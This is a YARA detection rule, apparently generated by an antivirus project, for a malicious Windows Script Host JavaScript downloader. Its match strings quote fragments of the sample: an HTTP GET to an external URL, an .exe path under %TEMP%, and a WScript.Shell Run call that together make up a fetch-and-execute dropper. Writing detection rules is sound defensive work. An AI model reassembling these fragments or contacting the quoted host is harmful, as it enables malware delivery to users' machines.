rule sig_20160329_6939027bc0bd297091534904946f84ca {
  meta:
    description = "datamaliciousorder - file 20160329_6939027bc0bd297091534904946f84ca.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dbcef210bb25b9f728a4ba429c390ef819a08a8ea7b2d30fb7c5644c056e6ffd"

  strings:
    $s1  = "j[Wx](\"GET\", \"http://refindsexy.com/i8eps\", false);" fullword ascii
    $s2  = "function W() {return e[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"AzmzSlUz3T41.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[T](yG() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var e = function xW() {return WScript[Zm](\"WScript.Shell\");}(), m = 11;" fullword ascii
    $s5  = "function C(Il, Rd){O = O * 1; return Il - Rd;};" fullword ascii
    $s6  = "function t(){return \"\" + P;};" fullword ascii
    $s7  = "function g(jx){e[\"Run\"](jx, O, O);};" fullword ascii
    $s8  = "function n() {return ((d == true) && (d == YZ)) ? 1 : O;};" fullword ascii
    $s9  = "function ME()" fullword ascii
    $s10 = " while (LM){" fullword ascii
    $s11 = "function Zt(nF) {var cz = (1, 2, 3, 4, 5, nF); return cz;};" fullword ascii
    $s12 = "function E(){return Zm;};" fullword ascii
    $s13 = "return C(J, jx0);" fullword ascii
    $s14 = "var qi = new this[\"Date\"]();" fullword ascii
    $s15 = "function yG(){return 22;};" fullword ascii
    $s16 = "d = true; " fullword ascii
    $s17 = "var G0 = false;" fullword ascii
    $s18 = "var d = false;" fullword ascii
    $s19 = "YZ = true; " fullword ascii
    $s20 = "var YZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}